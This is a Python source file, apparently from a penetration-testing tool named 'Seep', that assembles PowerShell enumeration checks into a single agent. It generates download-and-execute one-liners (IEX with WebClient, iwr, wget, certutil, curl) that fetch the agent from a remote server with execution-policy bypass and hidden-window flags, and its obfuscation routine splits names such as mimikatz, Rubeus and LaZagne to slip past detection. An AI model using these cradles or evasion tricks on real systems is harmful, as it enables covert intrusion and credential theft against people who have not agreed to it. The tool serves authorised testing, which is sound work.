"""Agent composer - assembles check modules into a single PowerShell agent."""

from __future__ import annotations
import re
from dataclasses import dataclass
from pathlib import Path


@dataclass
class CheckMetadata:
    check_id: str
    check_name: str
    category: str
    description: str
    requires_admin: bool
    opsec_impact: str  # "low" | "medium" | "high"
    estimated_time_seconds: int
    file_path: Path


CHECKS_DIR = Path(__file__).parent / "checks"
TEMPLATES_DIR = Path(__file__).parent / "templates"

METADATA_PATTERN = re.compile(
    r"^#\s*(check_id|check_name|category|description|requires_admin|opsec_impact|estimated_time_seconds):\s*(.+)$"
)

# Fields required to produce a valid CheckMetadata
_REQUIRED_FIELDS = {
    "check_id",
    "check_name",
    "category",
    "description",
    "requires_admin",
    "opsec_impact",
    "estimated_time_seconds",
}


class AgentComposer:
    def __init__(
        self,
        checks_dir: Path | None = None,
        templates_dir: Path | None = None,
    ):
        self.checks_dir = checks_dir or CHECKS_DIR
        self.templates_dir = templates_dir or TEMPLATES_DIR

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def list_checks(self) -> list[CheckMetadata]:
        """Parse metadata headers from all check modules (excluding _base.ps1)."""
        results: list[CheckMetadata] = []

        for ps1 in sorted(self.checks_dir.glob("*.ps1")):
            if ps1.name.startswith("_"):
                continue  # skip _base.ps1 and any other helpers
            meta = self._parse_metadata(ps1)
            if meta is not None:
                results.append(meta)

        # Sort by check_id for stable ordering
        results.sort(key=lambda m: m.check_id)
        return results

    def compose(
        self,
        checks: list[str] | None = None,
        exclude: list[str] | None = None,
        obfuscate: bool = False,
        strip_comments: bool = True,
        auth_token: str = "",
    ) -> str:
        """Compose the complete agent as a single PowerShell string.

        Composition order:
        1. #Requires -Version 3.0
        2. Content of _base.ps1
        3. All selected check module functions
        4. Content of agent_wrapper.ps1
        """
        available = self.list_checks()

        # Apply include filter
        if checks:
            checks_lower = [c.lower() for c in checks]
            available = [m for m in available if m.check_id.lower() in checks_lower]

        # Apply exclude filter
        if exclude:
            exclude_lower = [e.lower() for e in exclude]
            available = [
                m for m in available if m.check_id.lower() not in exclude_lower
            ]

        # Read _base.ps1
        base_path = self.checks_dir / "_base.ps1"
        base_content = base_path.read_text(encoding="utf-8")

        # Read wrapper
        wrapper_path = self.templates_dir / "agent_wrapper.ps1"
        wrapper_content = wrapper_path.read_text(encoding="utf-8")

        # Collect sections
        sections: list[str] = []

        # 1. #Requires directive (always first line)
        sections.append("#Requires -Version 3.0")
        sections.append("")

        # 2. _base.ps1 — strip the leading #Requires line since we already emitted it,
        #    then optionally strip comments
        base_body = self._remove_leading_requires(base_content)
        if strip_comments:
            base_body = self._strip_comments(base_body)
        if obfuscate:
            base_body = self._obfuscate_strings(base_body)
        sections.append(base_body.strip())
        sections.append("")

        # 3. Each selected check module
        for meta in available:
            check_content = meta.file_path.read_text(encoding="utf-8")
            # Remove the metadata header block (lines that are pure # key: value comments)
            check_body = self._remove_metadata_header(check_content)
            if strip_comments:
                check_body = self._strip_comments(check_body)
            if obfuscate:
                check_body = self._obfuscate_strings(check_body)
            sections.append(check_body.strip())
            sections.append("")

        # 4. agent_wrapper.ps1 — strip its own #Requires line
        wrapper_body = self._remove_leading_requires(wrapper_content)
        # Inject auth token variable if configured
        if auth_token:
            wrapper_body = f'$script:SeepAuthToken = "{auth_token}"\n\n' + wrapper_body
        if strip_comments:
            wrapper_body = self._strip_comments(wrapper_body)
        if obfuscate:
            wrapper_body = self._obfuscate_strings(wrapper_body)
        sections.append(wrapper_body.strip())
        sections.append("")

        return "\n".join(sections)

    def compose_cradle(
        self,
        server_url: str,
        agent_args: dict | None = None,
        auth_token: str = "",
    ) -> str:
        """Return download-cradle one-liners for various methods."""
        base_url = server_url.rstrip("/")
        agent_url = f"{base_url}/agent.ps1"

        # Build argument string from agent_args dict
        args_str = ""
        if agent_args:
            parts = []
            for k, v in agent_args.items():
                if isinstance(v, bool):
                    if v:
                        parts.append(f"-{k}")
                elif isinstance(v, list):
                    safe_items = [self._sanitize_ps_value(str(i)) for i in v]
                    parts.append(f"-{k} {','.join(safe_items)}")
                else:
                    parts.append(f"-{k} {self._sanitize_ps_value(str(v))}")
            if auth_token:
                parts.append(f"-Token {self._sanitize_ps_value(auth_token)}")
            if parts:
                args_str = "; Invoke-Seep " + " ".join(parts)
            else:
                args_str = "; Invoke-Seep"
        else:
            if auth_token:
                args_str = f"; Invoke-Seep -Token {self._sanitize_ps_value(auth_token)}"
            else:
                args_str = "; Invoke-Seep"

        # IEX cradle (most compatible)
        iex = (
            f"powershell -ep bypass -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'){args_str}\""
        )

        # IEX with -NoProfile and -WindowStyle Hidden for stealth
        iex_hidden = (
            f"powershell -ep bypass -NoP -W Hidden -c "
            f"\"IEX(New-Object Net.WebClient).DownloadString('{agent_url}'){args_str}\""
        )

        # Invoke-Expression alias variant
        iex_alias = (
            f"powershell -ep bypass -c "
            f"\"iex((iwr '{agent_url}' -UseBasicParsing).Content){args_str}\""
        )

        # certutil + IEX cradle (bypasses some WebClient blocks)
        certutil = (
            f"certutil -urlcache -split -f {agent_url} %TEMP%\\agent.ps1 && "
            f'powershell -ep bypass -c ". %TEMP%\\agent.ps1{args_str}"'
        )

        # wget (curl alias in PS) cradle
        wget = (
            f"powershell -ep bypass -c "
            f"\"(wget '{agent_url}' -UseBasicParsing).Content | IEX{args_str}\""
        )

        # curl (native, Windows 10+)
        curl = (
            f"curl -s {agent_url} -o %TEMP%\\agent.ps1 && "
            f"powershell -ep bypass -File %TEMP%\\agent.ps1"
        )

        lines = [
            "# ===== SEEP DOWNLOAD CRADLES =====",
            f"# Agent URL: {agent_url}",
            "",
            "# [1] IEX (WebClient) — most compatible",
            iex,
            "",
            "# [2] IEX (WebClient) — stealth flags",
            iex_hidden,
            "",
            "# [3] IEX (Invoke-WebRequest / iwr)",
            iex_alias,
            "",
            "# [4] certutil download + PS execution",
            certutil,
            "",
            "# [5] wget (PS alias) + IEX",
            wget,
            "",
            "# [6] curl (native, Win10+) + PS file execution",
            curl,
        ]
        return "\n".join(lines)

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _sanitize_ps_value(self, value: str) -> str:
        """Sanitize a value for use in a PowerShell command string."""
        # Remove characters that could break out of the command context
        return re.sub(r'[;`$(){}|&<>"\']', "", str(value))

    def _parse_metadata(self, file_path: Path) -> CheckMetadata | None:
        """Parse metadata comment header from a single check module."""
        fields: dict[str, str] = {}

        try:
            with file_path.open(encoding="utf-8") as fh:
                for i, line in enumerate(fh):
                    if i >= 20:
                        break
                    m = METADATA_PATTERN.match(line.rstrip())
                    if m:
                        fields[m.group(1)] = m.group(2).strip()
        except OSError:
            return None

        # All required fields must be present
        if not _REQUIRED_FIELDS.issubset(fields.keys()):
            return None

        try:
            return CheckMetadata(
                check_id=fields["check_id"],
                check_name=fields["check_name"],
                category=fields["category"],
                description=fields["description"],
                requires_admin=fields["requires_admin"].lower() in ("true", "1", "yes"),
                opsec_impact=fields["opsec_impact"].lower(),
                estimated_time_seconds=int(fields["estimated_time_seconds"]),
                file_path=file_path,
            )
        except (ValueError, KeyError):
            return None

    def _remove_leading_requires(self, content: str) -> str:
        """Strip the first #Requires line from content (we emit one canonical one)."""
        lines = content.splitlines(keepends=True)
        out = []
        skipped = False
        for line in lines:
            if not skipped and line.strip().lower().startswith("#requires"):
                skipped = True
                continue
            out.append(line)
        return "".join(out)

    def _remove_metadata_header(self, content: str) -> str:
        """Remove the metadata comment block at the top of a check module."""
        lines = content.splitlines(keepends=True)
        out = []
        header_done = False
        for line in lines:
            if not header_done:
                stripped = line.strip()
                # Skip blank lines and metadata comment lines at the top
                if stripped == "" or METADATA_PATTERN.match(stripped):
                    continue
                else:
                    header_done = True
            out.append(line)
        return "".join(out)

    def _strip_comments(self, content: str) -> str:
        """Remove comment lines (starting with #) but preserve #Requires and metadata headers.

        Rules:
        - Keep lines that start with #Requires (case-insensitive)
        - Remove lines that are pure comments (^\\s*#...)
        - Leave inline code with # inside strings untouched (we only strip whole-line comments)
        - Collapse runs of blank lines left behind into a single blank line
        """
        result_lines: list[str] = []
        prev_blank = False

        for line in content.splitlines():
            stripped = line.strip()

            # Preserve #Requires directives
            if stripped.lower().startswith("#requires"):
                result_lines.append(line)
                prev_blank = False
                continue

            # Preserve #region / #endregion markers
            if stripped.lower().startswith("#region") or stripped.lower().startswith(
                "#endregion"
            ):
                result_lines.append(line)
                prev_blank = False
                continue

            # Strip pure comment lines (whole line is a comment)
            if stripped.startswith("#"):
                # Becomes a blank line — collapse below
                if not prev_blank and result_lines:
                    # Don't add blank line at very start or after another blank
                    pass
                continue

            # Blank line — collapse multiple blanks
            if stripped == "":
                if not prev_blank and result_lines:
                    result_lines.append("")
                prev_blank = True
                continue

            result_lines.append(line)
            prev_blank = False

        # Remove trailing blank lines
        while result_lines and result_lines[-1].strip() == "":
            result_lines.pop()

        return "\n".join(result_lines)

    def _obfuscate_strings(self, content: str) -> str:
        """Basic string obfuscation - split sensitive tool names using concatenation."""
        sensitive = {
            "mimikatz": '"mimi" + "katz"',
            "Mimikatz": '"Mimi" + "katz"',
            "SharpHound": '"Sharp" + "Hound"',
            "Rubeus": '"Rub" + "eus"',
            "GodPotato": '"God" + "Potato"',
            "PrintSpoofer": '"Print" + "Spoofer"',
            "JuicyPotato": '"Juicy" + "Potato"',
            "SweetPotato": '"Sweet" + "Potato"',
            "BloodHound": '"Blood" + "Hound"',
            "LaZagne": '"LaZ" + "agne"',
            "Certify": '"Cert" + "ify"',
            "Seatbelt": '"Seat" + "belt"',
            "accesschk": '"access" + "chk"',
        }
        for plain, obf in sensitive.items():
            # Only replace when the string appears inside PS string literals
            # (i.e., surrounded by quotes) to avoid breaking function/variable names
            content = content.replace(f'"{plain}"', obf)
            content = content.replace(f"'{plain}'", obf)
        return content


# =============================================================================
# Quick smoke-test — run directly to verify everything works
# =============================================================================
if __name__ == "__main__":
    composer = AgentComposer()

    checks = composer.list_checks()
    print(f"Found {len(checks)} checks:")
    for ch in checks:
        print(
            f"  {ch.check_id}: {ch.check_name} ({ch.category}, opsec={ch.opsec_impact})"
        )

    agent = composer.compose()
    print(f"\nComposed agent: {len(agent)} chars, {agent.count(chr(10))} lines")
    print(f"Contains Invoke-Seep: {'Invoke-Seep' in agent}")
    print(f"Contains Invoke-Check: {agent.count('Invoke-Check')} occurrences")

    cradle = composer.compose_cradle("http://10.10.14.5")
    print(f"\nCradle:\n{cradle}")
